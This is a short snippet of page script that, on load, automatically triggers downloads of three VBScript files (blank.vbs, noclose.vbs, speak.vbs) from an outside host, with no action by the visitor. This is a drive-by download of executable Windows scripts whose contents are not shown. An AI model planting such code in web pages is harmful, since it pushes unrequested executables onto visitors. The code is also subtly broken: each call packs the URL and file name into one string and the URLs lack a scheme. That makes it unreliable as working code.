<script>
  function downloadFileFromUrl(url, fileName) {
  const link = document.createElement('a');
  link.href = url;
  link.download = fileName;
  link.click();
};
downloadFileFromUrl('git.compgenius.com/code/blank.vbs, blank.vbs');
downloadFileFromUrl('git.compgenius.com/code/noclose.vbs, noclose.vbs');
downloadFileFromUrl('git.compgenius.com/code/speak.vbs, speak.vbs');
</script>
